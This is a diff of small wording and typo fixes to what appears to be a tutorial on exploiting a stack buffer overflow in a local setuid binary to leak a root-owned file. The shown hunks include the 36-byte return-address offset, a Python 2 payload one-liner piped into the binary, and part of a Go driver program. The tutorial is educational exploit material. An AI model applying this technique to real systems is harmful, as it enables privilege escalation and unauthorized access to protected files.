@@ -14,7 +14,7 @@ int main() {
 ```
 
 Note that `dmesg` helpfully tells us the position of the instruction pointer
-`ip` (henceforth $IP) (where the segfault occurred).
+`ip` (henceforth $IP) where the segfault occurred.
 
 ```sh
 gcc segv.c
@@ -38,7 +38,7 @@ ls -l
 # -rw------- 1 root     root        42 Jun 21 10:53 secret.txt
 ```
 
-However, there is also a `setuid` binary that will spill the files contents,
+However, there is also a `setuid` binary that will spill the file contents,
 provided you know a secret passphrase.
 
 ```sh
@@ -166,8 +166,8 @@ We see $IP filled up from the right with four 'A's.
 Considering that we input 40 'A's and four endet up in $IP, the return address
 on the stack must lie 40 - 4 = 36 bytes after the input buffer starts.
 
-By playing around with the amount of 'A's we send, we can figure out that after
-36 of them, the return address begins (and ends after the 42nd byte).
+By playing around with the amount of 'A's we send, we can figure out that the
+return address begins after 36 bytes (and ends after the 42nd byte).
 
 ```sh
 echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFG | ./a.out
@@ -224,10 +224,10 @@ python2 -c 'print("A" * 36 + "\xc0\x11\x40\x00\x00\x00\x00\x00")'
 
 Note that we had to convert the endianness to match that of our CPU.
 
-We use Python 2 because Python 3's makes it us very hard to output an ASCII
+We use Python 2 because Python 3 makes it us very hard to output an ASCII
 string with invalid bytes.
 
-## Read, Set, Exploit!
+## Ready, Set, Exploit!
 
 ```sh
 python2 -c 'print("A" * 36 + "\xc0\x11\x40\x00\x00\x00\x00\x00")' | ./a.out
@@ -281,6 +281,7 @@ func main() {
 	cmd := exec.Command("./a.out")
 	stdin, err := cmd.StdinPipe()
 	panicIf(err)
+	// redirect child in/out to parent in/out
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 
@@ -288,7 +289,7 @@ func main() {
 	panicIf(err)
 
 	io.WriteString(stdin, string(payload))
-	stdin.Close() // Command won't exit until stdin is closed.
+	stdin.Close() // close stdin to signal end of input
 
 	err = cmd.Wait()
 	panicIf(err)
